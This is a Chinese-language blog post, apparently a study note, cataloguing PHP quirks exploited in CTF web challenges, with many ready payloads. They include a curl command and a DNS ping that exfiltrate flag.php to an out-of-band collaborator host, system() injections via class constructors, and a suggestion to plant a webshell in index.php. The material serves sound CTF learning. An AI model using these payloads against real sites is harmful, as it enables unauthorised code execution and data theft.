---
title: PHP特性
published: 2026-07-23
description: PHP常见特性与CTF考点总结
category: 信息安全
draft: false
---

# PHP特性

## 数字

### intval()

```php
intval($num, $base)
当 $base = 0 时，intval() 会自动识别字符串的进制
```

- 数组：intval(num[]=1)=1

- 字符串：intval(4476a, 0)=4476

- 十六进制：intval(0x117c, 0)=4476

- 八进制：intval(010574, 0)=4476

  ```text
  八进制绕过
  1.%2b（+ 号）
  ?num=+010574和?num=%2b010574
  2.%20（空格）、%0a（换行）、%0d（回车）
  ?num=%20010574
  ```

- 浮点数取整：intval(4476.0, 0)=4476

- 科学计数法：intval(4476e0, 0)=4476

- 逻辑漏洞：intval()为取整函数，可以用?num=4476.1

### trim($num)!=='36'

去除 `$num` 字符串**首尾的空白字符**（空格、制表符、换行符等）

- `%0c` 是 **换页符**

  ```php
  ?num=%0c36
  ```


### strcmp

数组绕过

```php
strcmp($a, $b) 如果 $a 或 $b 是数组，会返回 NULL。
```

### in_array()

in_array('1.php'):`'1.php'` 会被转换成整数 `1`

## 字符串

### highlight_file()

- 当前目录：?u=./flag.php

- 多级当前目录：?u=././flag.php

- php://伪协议：

  ```html
  ?u=php://filter/read=convert.base64-encode/resource=flag.php
  
  /?u=file:///var/www/html/flag.php
  ```

### ereg()：正则匹配函数（旧版正则函数）

**存在 NULL 字节截断漏洞**

?c=a%00778：只检查a

### MD5 碰撞字符串（数值绕过）

```
md5() 函数无法处理数组，会返回 NULL
a[]=1&b[]=2		NULL === NULL → true ✅
```

## 运算符

### 优先级

核心考点是 `=`（赋值）的优先级高于 `and`

```text
?v1=1&v2=var_dump($ctfshow)/*&v3=*/;
eval("var_dump($ctfshow)/*('ctfshow')*/;");
```

这四个符号的优先级从高到低分别是：**&&、||、AND、OR**

## 类

```php
eval("$v2('ctfshow')$v3");
```

- 利用反射类（ReflectionClass）

  ```text
  ?v1=1&v2=echo new Reflectionclass&v3=;
  eval("echo new Reflectionclass('ctfshow');");
  ```

```php
eval("echo new $v1($v2());");
```

- 反射类

  ```php
  ?v1=ReflectionClass&v2=system('cat fl36dg.txt')
  ```

- Exception类

  ```php
  v1=Exception&v2=system('cat fl36dg.txt') 
  ```

- Error类

  ```php
  v1=Error&v2=system('cat fl36dg.txt') 
  ```

- `FilesystemIterator`（迭代器）

  ```php
  ?v1=FilesystemIterator&v2=getcwd
  ```

  - `getcwd()` 返回当前目录路径
  - echo FilesystemIterator(路径) → 输出路径下第一个文件名

### call_user_func()

```php
call_user_func($callback, $args);
call_user_func(['类名', '方法名']);
```

### creat_function()

创建匿名函数

```text
create_function(string $args, string $code): string
```

```php
题目
if(isset($_POST['ctf'])){
    $ctfshow = $_POST['ctf'];
    if(!preg_match('/^[a-z0-9_]*$/isD',$ctfshow)) {
        $ctfshow('',$_GET['show']);
    }

}
```

```php
GET ?show=;};system('grep flag flag.php');/*
POST ctf=%5ccreate_function
#得到的是：function lambda_1() {
    ;};system('grep flag flag.php');/*
}
#这里有的sql注入的意思，`:}`是提前闭合函数体，`/*`是注释掉后面的`}`和其他内容
`/*`开始一个多行注释，它会一直生效，直到遇到第一个`*/`为止,如果在一个代码块的末尾（即文件结尾或代码执行结束）之前都没有遇到 */，那么 /* 之后的所有内容都会被当作注释，直到代码结束。这不会产生语法错误。
```

## 变量

### 变量覆盖

- extract()：将数组中的键名作为变量名，键值作为变量值

  **将原有的变量覆盖**

- parse_str()： 用于解析查询字符串。如果调用该函数时**没有指定第二个参数（输出数组）**，解析出来的变量会直接注入到当前作用域，从而覆盖同名变量。

- 全局变量注册 (**`register_globals`**)：将外部引入的值覆盖原本的变量，导致权限绕过

- 动态变量($$):一个变量的值可以作为另一个变量的变量名

  利用逻辑漏洞来进行覆盖变量

```php
#题目
highlight_file(__FILE__);
include('flag.php');
error_reporting(0);
$error='你还想要flag嘛？';
$suces='既然你想要那给你吧！';
foreach($_GET as $key => $value){
    if($key==='error'){
        die("what are you doing?!");
    }
    $$key=$$value;
}foreach($_POST as $key => $value){
    if($value==='flag'){
        die("what are you doing?!");
    }
    $$key=$$value;
}
if(!($_POST['flag']==$flag)){
    die($error);
}
echo "your are good".$flag."\n";
die($suces);
?> 
```

>  这个题目主要考察逻辑题，看到先是GET覆盖后来是POST覆盖，最后是$_POST['flag']==$flag为False是我们的目的，die(`$error);要求我们要进行变量覆盖&error=&flag，`而POST中$value不能等于flag,因此需要变量传递。
>
> GET: ?suces=flag POST: error=suces

### 变量的属性

函数内不能引用外部变量，但是可以转换为GLOBALS（系统全局变量）

```text
题目
eval("$$v1 = &$$v2;");
var_dump($$v1); 
```

#### 变量的传递与覆盖

```php
?v1=ctfshow&v2=GLOBALS
```

#### 变量的存在

```text
CTF_SHOW=1&CTF[SHOW.COM=1&fun=extract($_POST)&fl0g=flag_give_me
extract()：将数组中的键名作为变量名，键值作为变量值，extract($_POST)可以提取其中的&fl0g
```

变量操作

```php
fun=var_export(get_defined_vars())
打印当前脚本中所有已定义的变量
parse_str($a[1])
把类似URL查询字符串的格式解析成变量
```

#### 将全局变量当成普通变量

```php
题目
<?php highlight_file(__FILE__);
$key1 = 0;
$key2 = 0;
if(isset($_GET['key1']) || isset($_GET['key2']) || isset($_POST['key1']) || isset($_POST['key2'])) {
    die("nonononono");
}
@parse_str($_SERVER['QUERY_STRING']);
extract($_POST);
if($key1 == '36d' && $key2 == '36d') {
    die(file_get_contents('flag.php'));
}
Payload：?_POST[key1]=36d&_POST[key2]=36d
这里的@parse_str($_SERVER['QUERY_STRING']);将字符串解析成变量，其中的&_POST成了普通变量数组，extract()：将数组中的键名作为变量名，键值作为变量值，从而提取出$key1='36d',$key2='36d'
```

### GET和POST

**当参数名包含空格、点号 `.`、或左方括号 `[` 时，这些字符会被自动转换成下划线 `_`**。

## 文件

- `is_file()` 函数的绕过：检查路径是否为**普通文件**

  `is_file()` 不会解析php://filter中的内容

  可以尝试**多种过滤器**

  ```php
  php://filter/[过滤器]/resource=文件名
  
  ?file=php://filter/resource=flag.php
  #将utf-8转换为utf-16的编码
  #这里highlight_file()解析后HTML字符串会以 UTF-8 编码输出到浏览器
  ?file=php://filter/convert.iconv.utf-8.utf-16/resource=flag.php
  
  php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php
  
  php://filter/read=convert.quoted-printable-encode/resource=flag.php
  
  ?f=php://filter/ctfshow/resource=flag.php
  ctfshow/ 被当作一个未知过滤器，PHP 会忽略它，继续解析后面的 resource=flag.php
  ```
  
  ```php
  #流包装器
  ?file=compress.zlib://flag.php
  #先压缩后解压，相当于什么也没有做
  ?file=php://filter/zlib.deflate|zlib.inflate/resource=flag.php
  ```
  
  ```php
  #进行目录溢出，超过is_file能处理的最大长度就不认为是个文件了
  #/proc/self/root代表根目录
  ?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
  ```

## PHP其他特性

### 正则表达式

正则匹配栈溢出的局限性

preg_match 函数的栈溢出会使其返回 false

PHP 默认的回溯次数上限是 `1000000`

```php
<?php
echo str_repeat('very', '250000').'36Dctfshow';
```

### 数据外带

```php
题目：
error_reporting(0);
highlight_file(__FILE__);
//flag.php
if($F = @$_GET['F']){
    if(!preg_match('/system|nc|wget|exec|passthru|netcat/i', $F)){
        eval(substr($F,0,6));
    }else{
        die("6个字母都还不够呀?!");
    }
}
/?F=`$F`;+curl -X POST -F xx=@flag.php http://[你的Collaborator域名] HTTP/1.1
这里是逻辑绕过，首先substr($F,0,6)得到：eval(`$F`);这里会执行$F,而shell执行会将变量$F认为是传进的参数F（?F=`$F`;+curl -X POST -F xx=@flag.php http://[你的Collaborator域名] HTTP/1.1），从而执行所有命令、

- 这里为什么啊哟进行外带数据，而不是在页面上进行显示数据
反引号的作用是执行系统命令，并返回命令的输出结果，但是，它只是"返回"结果，并不负责"显示"结果。
    
比如 curl 把数据发到你的服务器
/?F=`$F`;+curl -X POST -F xx=@flag.php http://[你的Collaborator域名] HTTP/1.1
ping 通过 DNS 查询把数据带出来。这样才能绕过"无回显"的限制
http://57d85bc8-8616-4811-aa3c-e7677d788f3b.challenge.ctf.show/?F=`$F`;+ping `cat /flag.php|grep ctfshow`.yfh1goc023kkn6b5crls9rw6xx3oref3.oastify.com -c 1
```

### 无回显

- 数据外带

- 写入文件

  ```php
  nl flag.php>2.txt
  cp flag.php>1.txt
  mv flag.txt 3.txt（不支持`>`重定向）
  #将ls/访问根目录的数据通过管道符写入，然后写入文件1
  #输入 → tee → 输出到屏幕
  #          ↘ 写入文件
  ls /|tee 1
  ```

- 盲注（根据反应时间）

### 返回空（NULL，0，False）的函数

```php
system(system())
usleep(usleep())
getdate(getdate())
这三个函数的内部要有参数，否则会False
```

## PHP无字母数字Webshell

这里提供思路，就不再举例说明了

这里这些运算配合URL编码来构造Payload

1. 异或运算（`~`）
2. 位运算





## PHP特性的常见考点

### 弱类型比较（`==`）:要求数字一样，类型自动转化

| 比较表达式           | 结果   | 原因                        |
| :------------------- | :----- | :-------------------------- |
| `'123' == 123`       | ✅ True | **字符串**转数字比较        |
| `'0e123' == '0e456'` | ✅ True | **科学计数法**，都等于0     |
| `'abc' == 0`         | ✅ True | **字符串**转数字失败，返回0 |
| `'' == 0`            | ✅ True | **空字符串**转数字为0       |
| `NULL == 0`          | ✅ True | **NULL**转数字为0           |
| `'1abc' == 1`        | ✅ True | **开头数字被提取**          |
| `'abc1' == 0`        | ✅ True | 开头不是数字，转为0         |
| `'0.1' == '0.10'`    | ✅ True | 浮点数比较                  |

### MD5/HASH绕过

- 科学计数法

  ```php
  md5('240610708') == md5('QNKCDZO') 为真
  md5('240610708') 的结果是：0e462097431906509019562988736854=0.0
  md5('QNKCDZO') 的结果是：0e830400451993494058024219903391=0.0
  ```

- 数组绕过

  ```php
  md5不能处理数组，返回NULL
  ?a[]=1&b[]=2  → md5($a) == md5($b) 返回 True
  ```

### 常见危险函数

| 函数                  | 作用                  | CTF考点                                |
| :-------------------- | :-------------------- | :------------------------------------- |
| `eval()`              | 把字符串当PHP代码执行 | 一句话木马、代码注入                   |
| `assert()`            | 检查断言是否为真      | 可执行代码（PHP7可动态调用）           |
| `system()`            | 执行系统命令          | 命令注入                               |
| `exec()`              | 执行系统命令          | 无输出，需用`echo`                     |
| `shell_exec()`        | 执行系统命令          | 返回结果                               |
| `passthru()`          | 执行系统命令          | **直接输出原始结果**                   |
| `popen()`             | 打开进程指针          | 执行命令                               |
| `file_get_contents()` | 读取文件内容          | 文件读取                               |
| `include/require`     | 包含文件              | 文件包含、LFI/RFI                      |
| `unserialize()`       | 反序列化              | 反序列化漏洞                           |
| `preg_replace()`      | 正则替换              | `/e`修饰符导致代码执行（PHP7.0已移除） |
| `create_function()`   | 创建匿名函数          | **变量函数执行**                       |
| `array_map()`         | 回调函数              | **回调后门**                           |

### 变量覆盖

- 全局变量覆盖
- extract() 函数
- parse_str() 函数

### 正则表达式绕过

- 换行符

  ```php
  preg_match('/^flag/', $input);
  // 可以用 %0a 或 \n 绕过：%0aflag
  ```

- Unicode绕过

  ```php
  preg_match('/^[a-z]+$/', $input);
  // 可以用 Unicode 字符（如 Ａ）绕过
  ```

- 数组绕过

  ```php
  preg_match('/flag/', $_GET['a']);
  // 传入数组：?a[]=flag  →  preg_match返回false
  ```

- 回溯限制

  ```php
  preg_match('/^(.*?)flag/', $input);
  // 构造超长字符串（>100万字符）让正则回溯超时
  ```

## 随机数或路径安全

- 随机数：mt_rand() 种子可预测

- session文件：路径可预测

  ```php
  session_save_path('/tmp');
  // 文件格式：sess_[session_id]
  // session_id 可以通过 Cookie 控制
  ```

### 反直觉（执行顺序）

```php
题目
include 'flag.php';
if(isset($_GET['code'])){
    $code=$_GET['code'];
    if(preg_match("/[A-Za-z0-9_\%\\|\~\'\,\.\:\@\&\*\+\- ]+/",$code)){
        die("error");
    }
    @eval($code);
}
else{
    highlight_file(__FILE__);
}

function get_ctfshow_fl0g(){
    echo file_get_contents("flag.php");
}
```

```text
?code=(("%08%02%08%09%05%0d")^("%7b%7b%7b%7d%60%60"))((("%03%01%09%01%06%02")^("%60%60%7d%21%60%28")));
这个表达式之所以能用，是因为%08%02%08%09%05%0d这些内容是GET传参的，而在PHP URL 解码后（$_GET['code']）变成了\x08\x02\x08\x09\x05\x0d不包含%，正则检查是在解码后执行
```

### 新思路

- 重构index.php，一般index.php是可以访问的，可以尝试在index.php上面写如一句话木马

- **当参数名包含空格、点号 `.`、或左方括号 `[` 时，这些字符会被自动转换成下划线 `_`**。

  ```php
  ..CTFSHOW.. → $__CTFSHOW__
  ```
